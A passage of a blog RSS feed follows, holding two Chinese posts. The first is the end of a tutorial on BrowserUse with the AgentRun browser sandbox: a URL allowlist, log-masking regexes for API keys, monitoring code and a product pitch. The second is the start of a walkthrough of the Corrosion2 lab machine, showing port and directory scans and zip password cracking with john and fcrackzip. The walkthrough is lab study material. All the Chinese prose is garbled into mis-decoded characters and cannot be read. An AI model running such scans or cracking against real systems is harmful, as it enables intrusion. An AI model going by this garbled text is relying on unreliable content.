    return any(allowed in domain for allowed in ALLOWED_DOMAINS)

def safe_navigate(page, url: str):
    """å®å¨å¯¼èª"""
    if not is_url_allowed(url):
        raise ValueError(f"URL ä¸å¨ç½ååä¸­: {url}")
    page.goto(url)
</code></pre>
<h3 id="æ¥å¿è±æ">æ¥å¿è±æ</h3>
<pre><code class="language-python">import re

def sanitize_log(log_text: str) -&gt; str:
    """æ¥å¿è±æ"""
    # è±æ API Key
    log_text = re.sub(r'sk-[a-zA-Z0-9]{20,}', 'sk-***', log_text)
    # è±æ Access Key
    log_text = re.sub(r'LTAI[a-zA-Z0-9]{12,}', 'LTAI***', log_text)
    # è±æå¯ç 
    log_text = re.sub(r'password["\s:=]+[^"\s,}]+', 'password: ***', log_text, flags=re.IGNORECASE)
    return log_text

# ä½¿ç¨
print(sanitize_log(f"ä½¿ç¨ API Key: {API_KEY}"))
</code></pre>
<h2 id="å¯è§æµæ§ä¸çæ§">å¯è§æµæ§ä¸çæ§</h2>
<h3 id="æ¥å¿è®°å½æä½³å®è·µ">æ¥å¿è®°å½æä½³å®è·µ</h3>
<pre><code class="language-python">import logging
from datetime import datetime

# éç½®æ¥å¿
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'sandbox_{datetime.now().strftime("%Y%m%d")}.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

class MonitoredSandboxManager:
    """å¸¦çæ§ç Sandbox ç®¡çå¨"""
    
    def create_sandbox(self, **kwargs):
        """åå»º Sandboxï¼å¸¦æ¥å¿ï¼"""
        start_time = time.time()
        logger.info(f"å¼å§åå»º Sandbox: {kwargs}")
        
        try:
            sandbox = Sandbox.create(**kwargs)
            duration = time.time() - start_time
            logger.info(f"Sandbox åå»ºæå: {sandbox.sandbox_id}, èæ¶: {duration:.2f}s")
            return sandbox
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Sandbox åå»ºå¤±è´¥: {e}, èæ¶: {duration:.2f}s")
            raise
    
    def execute_task(self, sandbox, task_name: str, operation):
        """æ§è¡ä»»å¡ï¼å¸¦æ¥å¿ï¼"""
        start_time = time.time()
        logger.info(f"å¼å§æ§è¡ä»»å¡: {task_name}, Sandbox: {sandbox.sandbox_id}")
        
        try:
            result = operation(sandbox)
            duration = time.time() - start_time
            logger.info(f"ä»»å¡æ§è¡æå: {task_name}, èæ¶: {duration:.2f}s")
            return result
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"ä»»å¡æ§è¡å¤±è´¥: {task_name}, éè¯¯: {e}, èæ¶: {duration:.2f}s")
            raise
</code></pre>
<h3 id="ææ æ¶é">ææ æ¶é</h3>
<pre><code class="language-python">from dataclasses import dataclass
from typing import Dict, List
import json

@dataclass
class SandboxMetrics:
    """Sandbox ææ """
    sandbox_id: str
    create_time: float
    destroy_time: float = None
    total_requests: int = 0
    failed_requests: int = 0
    total_duration: float = 0.0

class MetricsCollector:
    """ææ æ¶éå¨"""
    
    def __init__(self):
        self.metrics: Dict[str, SandboxMetrics] = {}
    
    def record_creation(self, sandbox_id: str):
        """è®°å½åå»º"""
        self.metrics[sandbox_id] = SandboxMetrics(
            sandbox_id=sandbox_id,
            create_time=time.time()
        )
    
    def record_request(self, sandbox_id: str, duration: float, success: bool):
        """è®°å½è¯·æ±"""
        if sandbox_id in self.metrics:
            metric = self.metrics[sandbox_id]
            metric.total_requests += 1
            metric.total_duration += duration
            if not success:
                metric.failed_requests += 1
    
    def record_destruction(self, sandbox_id: str):
        """è®°å½éæ¯"""
        if sandbox_id in self.metrics:
            self.metrics[sandbox_id].destroy_time = time.time()
    
    def export_metrics(self, filepath: str):
        """å¯¼åºææ """
        metrics_data = [
            {
                'sandbox_id': m.sandbox_id,
                'create_time': m.create_time,
                'destroy_time': m.destroy_time,
                'total_requests': m.total_requests,
                'failed_requests': m.failed_requests,
                'success_rate': (m.total_requests - m.failed_requests) / m.total_requests if m.total_requests &gt; 0 else 0,
                'avg_duration': m.total_duration / m.total_requests if m.total_requests &gt; 0 else 0,
                'lifetime': m.destroy_time - m.create_time if m.destroy_time else time.time() - m.create_time
            }
            for m in self.metrics.values()
        ]
        
        with open(filepath, 'w') as f:
            json.dump(metrics_data, f, indent=2)

# ä½¿ç¨
collector = MetricsCollector()
collector.record_creation(sandbox.sandbox_id)
# ... æ§è¡ä»»å¡ ...
collector.export_metrics('metrics.json')
</code></pre>
<h2 id="ææ¬ä¼å">ææ¬ä¼å</h2>
<h3 id="æéåå»ºä¸éæ¯">æéåå»ºä¸éæ¯</h3>
<pre><code class="language-python">class CostOptimizedManager:
    """ææ¬ä¼åçç®¡çå¨"""
    
    def __init__(self, idle_threshold=300):
        self.idle_threshold = idle_threshold
        self.sandboxes = {}
        self.last_used = {}
    
    def get_sandbox(self, key: str):
        """è·å Sandboxï¼æå è½½ï¼"""
        if key not in self.sandboxes:
            self.sandboxes[key] = Sandbox.create(
                template_type=TemplateType.BROWSER,
                template_name=os.getenv("BROWSER_TEMPLATE_NAME"),
                sandbox_idle_timeout_seconds=self.idle_threshold
            )
        
        self.last_used[key] = time.time()
        return self.sandboxes[key]
    
    def cleanup_idle(self):
        """æ¸çé²ç½® Sandbox"""
        current_time = time.time()
        to_remove = []
        
        for key, last_time in self.last_used.items():
            if current_time - last_time &gt; self.idle_threshold:
                to_remove.append(key)
        
        for key in to_remove:
            if key in self.sandboxes:
                self.sandboxes[key].delete()
                del self.sandboxes[key]
                del self.last_used[key]
                logger.info(f"æ¸çé²ç½® Sandbox: {key}")
</code></pre>
<h3 id="æ¹éä»»å¡å¤ç">æ¹éä»»å¡å¤ç</h3>
<pre><code class="language-python">async def batch_process_tasks(tasks: List[str], pool_size: int = 5):
    """æ¹éå¤çä»»å¡ï¼å¤ç¨ Sandboxï¼"""
    pool = SandboxPool(pool_size=pool_size)
    results = []
    
    for task in tasks:
        sandbox = pool.acquire()
        try:
            # å¤çä»»å¡
            result = await process_task(sandbox, task)
            results.append(result)
        finally:
            pool.release(sandbox)
    
    return results
</code></pre>
<h2 id="çäº§ç¯å¢é¨ç½²">çäº§ç¯å¢é¨ç½²</h2>
<h3 id="ç¯å¢éç½®">ç¯å¢éç½®</h3>
<p><strong>å¼åç¯å¢ (.env.dev)</strong>ï¼</p>
<pre><code class="language-bash"># å¼åç¯å¢éç½®
BROWSER_TEMPLATE_NAME=dev-browser-template
SANDBOX_IDLE_TIMEOUT=7200
POOL_SIZE=2
LOG_LEVEL=DEBUG
</code></pre>
<p><strong>çäº§ç¯å¢ (.env.prod)</strong>ï¼</p>
<pre><code class="language-bash"># çäº§ç¯å¢éç½®
BROWSER_TEMPLATE_NAME=prod-browser-template
SANDBOX_IDLE_TIMEOUT=300
POOL_SIZE=10
LOG_LEVEL=INFO
ENABLE_METRICS=true
METRICS_EXPORT_INTERVAL=300
</code></pre>
<h3 id="é«å¯ç¨æ¶æ">é«å¯ç¨æ¶æ</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2123714/202601/2123714-20260120161152830-801036086.png" class="lazyload"></p>
<h3 id="å¥åº·æ£æ¥">å¥åº·æ£æ¥</h3>
<pre><code class="language-python">from flask import Flask, jsonify

app = Flask(__name__)
manager = SandboxManager()

@app.route('/health')
def health_check():
    """å¥åº·æ£æ¥ç«¯ç¹"""
    try:
        # æ£æ¥ Sandbox æ¯å¦å¯ç¨
        sandbox = manager.get_or_create()
        
        # ç®åçå¥åº·æ£æ¥
        is_healthy = hasattr(sandbox, 'sandbox_id')
        
        if is_healthy:
            return jsonify({
                'status': 'healthy',
                'sandbox_id': sandbox.sandbox_id,
                'timestamp': time.time()
            }), 200
        else:
            return jsonify({
                'status': 'unhealthy',
                'error': 'Sandbox not available'
            }), 503
    except Exception as e:
        return jsonify({
            'status': 'unhealthy',
            'error': str(e)
        }), 503

@app.route('/metrics')
def metrics():
    """ææ ç«¯ç¹"""
    collector = MetricsCollector()
    # è¿åå½åææ 
    return jsonify({
        'total_sandboxes': len(collector.metrics),
        'timestamp': time.time()
    })
</code></pre>
<h2 id="æéææ¥ä¸å¸¸è§é®é¢">æéææ¥ä¸å¸¸è§é®é¢</h2>
<h3 id="è¿æ¥é®é¢">è¿æ¥é®é¢</h3>
<p><strong>é®é¢</strong>ï¼æ æ³è¿æ¥å° Sandbox</p>
<p><strong>ææ¥æ­¥éª¤</strong>ï¼</p>
<pre><code class="language-python">def diagnose_connection(sandbox):
    """è¯æ­è¿æ¥é®é¢"""
    print(f"1. æ£æ¥ Sandbox ID: {sandbox.sandbox_id}")
    print(f"2. æ£æ¥ CDP URL: {sandbox.cdp_url}")
    
    # æµè¯ CDP è¿æ¥
    try:
        with sync_playwright() as p:
            browser = p.chromium.connect_over_cdp(sandbox.cdp_url)
            print("â CDP è¿æ¥æå")
            browser.close()
    except Exception as e:
        print(f"â CDP è¿æ¥å¤±è´¥: {e}")
    
    # æµè¯ VNC è¿æ¥
    print(f"3. VNC URL: {sandbox.vnc_url}")
    print("æç¤º: å¯ä»¥å¨æµè§å¨ä¸­æå¼ VNC URL æµè¯è¿æ¥")
</code></pre>
<h3 id="è¶æ¶é®é¢">è¶æ¶é®é¢</h3>
<p><strong>é®é¢</strong>ï¼ä»»å¡æ§è¡è¶æ¶</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼</p>
<pre><code class="language-python">def handle_timeout(sandbox, operation, max_retries=3):
    """å¤çè¶æ¶ï¼å¸¦éè¯ï¼"""
    for attempt in range(max_retries):
        try:
            return operation(sandbox, timeout=30000)
        except TimeoutError:
            logger.warning(f"ä»»å¡è¶æ¶ï¼å°è¯ {attempt + 1}/{max_retries}ï¼")
            if attempt == max_retries - 1:
                # æåä¸æ¬¡å°è¯å¤±è´¥ï¼éå»º Sandbox
                logger.error("å¤æ¬¡è¶æ¶ï¼éå»º Sandbox")
                sandbox.delete()
                sandbox = Sandbox.create(
                    template_type=TemplateType.BROWSER,
                    template_name=os.getenv("BROWSER_TEMPLATE_NAME")
                )
                return operation(sandbox, timeout=60000)
</code></pre>
<h3 id="æ§è½é®é¢">æ§è½é®é¢</h3>
<p><strong>é®é¢</strong>ï¼ååºéåº¦æ¢</p>
<p><strong>ä¼åå»ºè®®</strong>ï¼</p>
<ol>
<li><strong>ä½¿ç¨è¿æ¥æ± </strong>ï¼é¢ååå»ºå¤ä¸ª Sandbox å®ä¾</li>
<li><strong>å¯ç¨ keep_alive</strong>ï¼ä¿ææµè§å¨ä¼è¯ï¼é¿åéå¤å»ºç«è¿æ¥</li>
<li><strong>åçè®¾ç½®è¶æ¶</strong>ï¼æ ¹æ®ä»»å¡å¤æåº¦è°æ´è¶æ¶æ¶é´</li>
<li><strong>å¹¶åæ§å¶</strong>ï¼éå¶å¹¶åè¯·æ±æ°ï¼é¿åèµæºç«äº</li>
</ol>
<pre><code class="language-python"># æ§è½ä¼åéç½®ç¤ºä¾
browser_session = BrowserSession(
    cdp_url=sandbox.cdp_url,
    browser_profile=BrowserProfile(
        timeout=30000,          # 30ç§è¶æ¶
        keep_alive=True,        # ä¿æè¿æ¥
        disable_security=False  # ä¿æå®å¨æ£æ¥
    )
)
</code></pre>
<h3 id="éè¯¯ç åè">éè¯¯ç åè</h3>
<table>
<thead>
<tr>
<th>éè¯¯ç </th>
<th>è¯´æ</th>
<th>è§£å³æ¹æ¡</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ConnectionError</code></td>
<td>è¿æ¥å¤±è´¥</td>
<td>æ£æ¥ç½ç»è¿æ¥ï¼éªè¯ CDP URL</td>
</tr>
<tr>
<td><code>TimeoutError</code></td>
<td>æä½è¶æ¶</td>
<td>å¢å è¶æ¶æ¶é´ï¼æ£æ¥ä»»å¡å¤æåº¦</td>
</tr>
<tr>
<td><code>AuthenticationError</code></td>
<td>è®¤è¯å¤±è´¥</td>
<td>éªè¯ API Key åè®¿é®å¯é¥</td>
</tr>
<tr>
<td><code>ResourceExhausted</code></td>
<td>èµæºä¸è¶³</td>
<td>åå°å¹¶åæ°ï¼å¢å èµæºéé¢</td>
</tr>
<tr>
<td><code>InvalidArgument</code></td>
<td>åæ°éè¯¯</td>
<td>æ£æ¥åæ°æ ¼å¼åæææ§</td>
</tr>
</tbody>
</table>
<h2 id="æ»ç»">æ»ç»</h2>
<p>éè¿æ¬æåï¼æ¨å·²ç»ææ¡äºï¼</p>
<ol>
<li><strong>BrowserUse éæ</strong>ï¼å¦ä½ä½¿ç¨ BrowserUse æ¡æ¶å®ç°æºè½æµè§å¨èªå¨å</li>
<li><strong>çå½å¨æç®¡ç</strong>ï¼ä¸ç§ Sandbox ç®¡çæ¨¡å¼çéæ©åå®ç°</li>
<li><strong>æ§è½ä¼å</strong>ï¼è¶æ¶éç½®ãå¤ç¨ç­ç¥ãéè¯¯éè¯æºå¶</li>
<li><strong>å®å¨å®è·µ</strong>ï¼ç¯å¢åéä¿æ¤ãURL ç½ååãæ¥å¿è±æ</li>
<li><strong>å¯è§æµæ§</strong>ï¼æ¥å¿è®°å½ãææ æ¶éãçæ§åè­¦</li>
<li><strong>ææ¬ä¼å</strong>ï¼æéåå»ºãé²ç½®æ¸çãæ¹éå¤ç</li>
<li><strong>çäº§é¨ç½²</strong>ï¼é«å¯ç¨æ¶æãå¥åº·æ£æ¥ãæéææ¥</li>
</ol>
<h2 id="ç«å³ä½éªå½æ°è®¡ç®-agentrun">ç«å³ä½éªå½æ°è®¡ç® AgentRun</h2>
<p>å½æ°è®¡ç® AgentRun çæ ä»£ç å°é«ä»£ç æ¼è¿è½åï¼ç°å·²å¼æ¾ä½éªï¼</p>
<ol>
<li><strong>å¿«éåå»º</strong>ï¼è®¿é®æ§å¶å°ï¼<a href="https://functionai.console.aliyun.com/cn-hangzhou/agent/explore" target="_blank" rel="noopener nofollow">https://functionai.console.aliyun.com/cn-hangzhou/agent/explore</a>ï¼ï¼60ç§åå»ºä½ çç¬¬ä¸ä¸ª Agent</li>
<li><strong>æ·±åº¦å®å¶</strong>ï¼å½éè¦æ´å¤æåè½æ¶ï¼ä¸é®è½¬æ¢ä¸ºé«ä»£ç </li>
<li><strong>æç»­æ¼è¿</strong>ï¼å©ç¨å½æ°è®¡ç® AgentRun çåºç¡è®¾æ½è½åï¼æç»­ä¼åä½ ç Agent</li>
</ol>
<p>ä»æ³æ³å°ä¸çº¿ï¼ä»ååå°çäº§ï¼å½æ°è®¡ç® AgentRun å§ç»æ¯ä½ æå¥½çä¼ä¼´ã<strong>æ¬¢è¿å å¥âå½æ°è®¡ç® AgentRun å®¢æ·ç¾¤âï¼ééç¾¤å·ï¼<em>134570017218</em>ã</strong></p>
<h2 id="å¿«éäºè§£å½æ°è®¡ç®-agentrun">å¿«éäºè§£å½æ°è®¡ç® AgentRun</h2>
<p><strong>ä¸å¥è¯ä»ç»ï¼</strong><a href="https://www.aliyun.com/product/fc/agentrun" target="_blank" rel="noopener nofollow">å½æ°è®¡ç® AgentRun</a> æ¯ä¸ä¸ªä»¥é«ä»£ç ä¸ºæ ¸å¿çä¸ç«å¼ Agentic AI åºç¡è®¾æ½å¹³å°ãç§æçæå¼æ¾åçµæ´»ç»è£ççå¿µï¼ä¸ºä¼ä¸çº§ Agent åºç¨æä¾ä»å¼åãé¨ç½²å°è¿ç»´çå¨çå½å¨æç®¡çã</p>

<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2123714/202601/2123714-20260120161152854-681277385.png" class="lazyload"></p>
<p>å½æ°è®¡ç® AgentRun æ¶æå¾</p>
<p>AgentRun è¿è¡æ¶åºäºé¿éäºå½æ°è®¡ç® FC æå»ºï¼ç»§æ¿äº Serverless è®¡ç®æè´å¼¹æ§ãæéä»è´¹ãé¶è¿ç»´çæ ¸å¿ä¼å¿ãéè¿æ·±åº¦éæ AgentScopeãLangChainãRAGFlowãMem0 ç­ä¸»æµå¼æºçæãå½æ°è®¡ç® AgentRun å° Serverless çæè´å¼¹æ§ãé¶è¿ç»´åæéä»è´¹çç¹æ§ä¸ AI åçåºç¨åºæ¯æ·±åº¦èåï¼å©åä¼ä¸å®ç°ææ¬ä¸æççæè´ä¼åï¼<strong>å¹³å TCO éä½ 60%</strong>ã</p>
<p><strong>è®©å¼åèåªéä¸æ³¨äº Agent çä¸å¡é»è¾åæ°ï¼æ éå³å¿åºå±åºç¡è®¾æ½ï¼è®© Agentic AI çæ­£è¿å¥ä¼ä¸çäº§ç¯å¢ã</strong></p>
<p><strong>æ¨èéè¯»ï¼</strong></p>
<ul>
<li>éè¯»<a href="https://yuque.alibaba-inc.com/agentrun/dxnn5p/rcpbigg7gthpa2u4" target="_blank" rel="noopener nofollow">ãå¿«éä¸æï¼LangChain + AgentRun æµè§å¨æ²ç®±æç®éææåã</a>å¤ä¹ åºç¡éæå LangChain éæ</li>
<li>æ¥ç<a href="https://docs.agent.run" target="_blank" rel="noopener nofollow">å®æ¹ææ¡£</a>äºè§£æ´å¤ AgentRun åè½</li>
<li>è®¿é®<a href="https://github.com/devsapp/agentrun-sandbox-demos" target="_blank" rel="noopener nofollow">ç¤ºä¾ä»£ç ä»åº</a> è·ååèä»£ç </li>
</ul>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-20 16:12">2026-01-20 16:12</span>&nbsp;
<a href="https://www.cnblogs.com/Serverless">Serverlessç¤¾åº</a>&nbsp;
éè¯»(<span id="post_view_count">57</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19507367);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19507367', targetLink: 'https://www.cnblogs.com/Serverless/p/19507367', title: 'è¿é¶æåï¼BrowserUse + Agentrun Sandbox æä½³å®è·µæå' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Corrosion2é¶æº ]]></title>
    <link>https://www.cnblogs.com/yuell/p/19507210</link>
    <guid>be3aa3fbe64753395ef1e3176babf456</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/yuell/p/19507210" title="åå¸äº 2026-01-20 15:45">
    <span role="heading" aria-level="2">Corrosion2é¶æº</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="0x01ä¿¡æ¯æ¶é">0x01ä¿¡æ¯æ¶é</h1>
<h2 id="11-nmapæ«æç«¯å£">1.1 nmapæ«æç«¯å£</h2>
<p><code>nmap -A -p- -v 192.168.222.134 </code><br>
<img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767838377647-6d3c9cb4-57cb-47ee-b40c-7a424545c7f0.png" alt="" loading="lazy"></p>
<pre><code class="language-plain">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)
|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)
|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
8080/tcp open  http    Apache Tomcat 9.0.53
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.53
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 26.829 days (since Fri Dec 12 14:17:12 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros

</code></pre>
<p>å¼æ¾ç«¯å£ï¼80ã8080ã22</p>
<p>ä¸»æºæä½ç³»ç»åå¶æå¡ï¼UbuntuãApache TomcatãOpenSSH 8.2p1 Ubuntu 4ubuntu0.3</p>
<h2 id="12webåå¶ç®å½æ«æ">1.2webåå¶ç®å½æ«æ</h2>
<p>å¼æ¾äº80ã8080ç«¯å£åå«è®¿é®</p>
<p>80ç«¯å£</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767838755910-70b66c83-7e85-45d7-b4cc-f457a1f030ee.png" alt="" loading="lazy"></p>
<p>ç½é¡µæ²¡å¯ç¨çï¼æ«ä¸ä¸ç®å½</p>
<p><code>dirsearch -u [http://192.168.222.134/](http://192.168.222.134/) -x 401,404,403</code></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767838945476-65861ad6-84ee-4493-89ab-a50eb77f6f3e.png" alt="" loading="lazy"></p>
<p>æ«åºæ¥æ²¡æå¥å¯ç¨çä¿¡æ¯</p>
<p>8080ç«¯å£</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767839239103-2de01363-9f42-4b8b-8a69-5900b70fa49c.png" alt="" loading="lazy"></p>
<p>tomcatä¸»é¡µçæ¬ä¸º9.0.53ï¼æ«ä¸ä¸ç®å½</p>
<p><code>dirsearch -u http://192.168.222.134:8080 -x 401,404,403</code>æè<code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://192.168.1.9:8080/FUZZ](http://192.168.1.9:8080/FUZZ)</code></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767839464572-dfc3a25d-2e2a-4d2c-a7db-51cd095d2dd0.png" alt="" loading="lazy"></p>
<pre><code class="language-plain">[10:30:23] 200 -   33KB - /backup.zip
[10:30:28] 302 -    0B  - /docs  -&gt;  /docs/
[10:30:28] 200 -   15KB - /docs/
[10:30:29] 302 -    0B  - /examples  -&gt;  /examples/
[10:30:29] 200 -    1KB - /examples/
[10:30:29] 200 -    1KB - /examples/websocket/index.xhtml
[10:30:29] 200 -   14KB - /examples/jsp/index.html
[10:30:29] 200 -    6KB - /examples/servlets/index.html
[10:30:29] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample
[10:30:29] 200 -  658B  - /examples/servlets/servlet/CookieExample
[10:30:29] 200 -  687B  - /examples/jsp/snp/snoop.jsp
[10:30:30] 200 -   21KB - /favicon.ico
[10:30:35] 302 -    0B  - /manager  -&gt;  /manager/
[10:30:35] 302 -    0B  - /manager/  -&gt;  /manager/html
[10:30:41] 200 -  153B  - /readme.txt
</code></pre>
<h2 id="13è´¦å·å°è¯ç®å½è¯¦ç»ä¿¡æ¯æ¶é">1.3è´¦å·å°è¯ï¼ç®å½è¯¦ç»ä¿¡æ¯æ¶é</h2>
<p>æ¥çç®å½éé¢æ«æåºæ¥çä¸è¥¿</p>
<p><strong>backup.zipï¼éè¦å¯ç è§£å</strong></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767839601898-675f2de0-bfac-4f99-a2d7-c5b188f6d2de.png" alt="" loading="lazy"></p>
<p><strong>çç ´ï¼çç ´å·¥å·å¯å¤éfcrackzipãjohn</strong></p>
<p>john:. åºæ¬åè½<br>
åå¸çç ´ï¼ç ´è§£å­å¨ä¸ºåå¸å¼çå¯ç ï¼å¦ Linux shadow æä»¶ãWindows NTLM åå¸ãMySQL å¯ç åå¸ç­ï¼ã<br>
å­å¸æ»å»ï¼åºäºå­å¸æä»¶å°è¯å¯ç ç»åã<br>
æ´åç ´è§£ï¼çæææå¯è½çå­ç¬¦ç»åï¼å¦ a-zã0-9ãç¹æ®å­ç¬¦ï¼è¿è¡å°è¯ã<br>
è§åç ´è§£ï¼éè¿èªå®ä¹è§åï¼å¦å¤§åé¦å­æ¯ãå æ°å­åç¼ï¼æ©å±å­å¸ï¼æé«ç ´è§£æçã<br>
æ¯æçåå¸ç±»å</p>
<table>
<thead>
<tr>
<th><strong>åå¸ç±»å / åºæ¯</strong></th>
<th><strong>å¯¹åºæä»¶ / æ ¼å¼ç¤ºä¾</strong></th>
<th><strong>John è¯å«æ¹å¼</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Linux ç³»ç»å¯ç </strong></td>
<td><strong>/etc/shadow æä»¶ï¼æ ¼å¼ï¼</strong><code>**ç¨æ·å:$id$salt$hash**</code><strong>ï¼</strong></td>
<td><strong>èªå¨è¯å«ï¼</strong><code>**$1$**</code>** ä¸º MD5ï¼<strong><code>**$6$**</code></strong> ä¸º SHA-512ï¼**</td>
</tr>
<tr>
<td><strong>Windows NTLM åå¸</strong></td>
<td><strong>æ ¼å¼ï¼</strong><code>**LM:NTLM**</code><strong>ï¼ç¤ºä¾ï¼</strong><code>**aad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99**</code><strong>ï¼</strong></td>
<td>**æå® **<code>**--format=nt**</code></td>
</tr>
<tr>
<td><strong>MySQL å¯ç åå¸</strong></td>
<td><strong>æ ¼å¼ï¼</strong><code>***hash**</code><strong>ï¼ç¤ºä¾ï¼</strong><code>***A4B6157319038724E3566C818872E067**</code><strong>ï¼</strong></td>
<td>**æå® **<code>**--format=mysql-sha1**</code></td>
</tr>
<tr>
<td><strong>ZIP åç¼©åå¯ç </strong></td>
<td><strong>åç¼©åæä»¶ï¼éåç¨ <strong><code>**zip2john**</code></strong> æååå¸ï¼</strong></td>
<td><strong>éè¿ <strong><code>**zip2john**</code></strong> çæçåå¸æä»¶èªå¨è¯å«</strong></td>
</tr>
<tr>
<td><strong>RAR åç¼©åå¯ç </strong></td>
<td><strong>åç¼©åæä»¶ï¼éåç¨ <strong><code>**rar2john**</code></strong> æååå¸ï¼</strong></td>
<td><strong>éè¿ <strong><code>**rar2john**</code></strong> çæçåå¸æä»¶èªå¨è¯å«</strong></td>
</tr>
<tr>
<td><strong>SSH ç§é¥å¯ç </strong></td>
<td><strong>id_rsa ç­ç§é¥æä»¶ï¼éåç¨ <strong><code>**ssh2john**</code></strong> æååå¸ï¼</strong></td>
<td><strong>éè¿ <strong><code>**ssh2john**</code></strong> çæçåå¸æä»¶èªå¨è¯å«</strong></td>
</tr>
</tbody>
</table>
<p><strong>è¡¥åè¯´æä¸è°æ´ï¼</strong></p>
<ol>
<li>Windows NTLM åå¸ï¼å®éå¸¸è§çæ ¼å¼ä¸º <code>LM:NTLM</code>ï¼ç¤ºä¾ä¸­å·²ä¿çåå·åéï¼John éä½¿ç¨ <code>--format=nt</code>ã</li>
<li>MySQL å¯ç åå¸ï¼ç¤ºä¾æ ¼å¼ä¸º <code>*hash</code>ï¼å®éæ¯ <code>mysql_native_password</code> ä½¿ç¨ç SHA1 åéåå¸ï¼John ä¸­åºä½¿ç¨ <code>--format=mysql-sha1</code>ã</li>
<li>ZIP/RAR åºåï¼<code>zip2john</code> ä¸ <code>rar2john</code> ä¸ºä¸åå·¥å·ï¼å»ºè®®åå¼ååºã</li>
<li>SSH ç§é¥ï¼éå¸¸ä½¿ç¨ <code>ssh2john</code>ï¼å±äº John the Ripper å·¥å·éï¼æååå¸ååè¿è¡ç ´è§£ã</li>
</ol>
<p><strong>fcrackzipï¼</strong><code>**&lt;font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"&gt;Fcrackzip&lt;/font&gt;**</code><strong><font style="color: rgba(77, 77, 77, 1)">æ¯ä¸æ¬¾ä¸é¨ç ´è§£</font></strong><code>**&lt;font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"&gt;zip&lt;/font&gt;**</code><strong><font style="color: rgba(77, 77, 77, 1)">ç±»ååç¼©æä»¶å¯ç çå·¥å·ï¼å·¥å·å°å·§æ¹ä¾¿ãç ´è§£éåº¦å¿«ï¼è½ä½¿ç¨å­å¸åæå®å­ç¬¦éç ´è§£ï¼éç¨äº</font></strong><code>**&lt;font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"&gt;linuxãmac osx&lt;/font&gt;**</code><strong><font style="color: rgba(77, 77, 77, 1)"> ç³»ç»</font></strong></p>
<p>å®è£ï¼<code>sudo apt-get install fcrackzip </code></p>
<p>å®è£å­å¸ï¼<font style="color: rgba(21, 167, 167, 1); background-color: rgba(242, 243, 245, 1)">rockyou.txtï¼</font></p>
<p><font style="color: rgba(77, 77, 77, 1)">å¨ Kali </font><a href="https://so.csdn.net/so/search?q=Linux&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener nofollow"><font style="color: rgba(252, 85, 49, 1)">Linux</font></a><font style="color: rgba(77, 77, 77, 1)"> ä¸­ï¼ä½¿ç¨ rockyou.txt ç ´è§£å å¯ä»£ç æå¯ç çæ­¥éª¤åå³äºå å¯æ¹å¼ï¼å¦ ZIPãRARãHASHã</font><font style="color: rgba(78, 161, 219, 1) !important">SSH</font><font style="color: rgba(77, 77, 77, 1)">ãFTP ç­ï¼</font></p>
<p><strong>å¥½çï¼è¿æ¯ä¸ä¸ªä»¥è¡¨æ ¼å½¢å¼æ´ççï¼å¨ Kali Linux ä¸­ä½¿ç¨ <strong><code>**rockyou.txt**</code></strong> ç ´è§£ä¸åç±»åå å¯/ä¿æ¤çéç¨æ­¥éª¤ãè¡¨æ ¼æ¸æ°å°å±ç¤ºäºä¸ååºæ¯ä¸çå·¥å·ãå½ä»¤åæ ¸å¿æè·¯ã</strong></p>
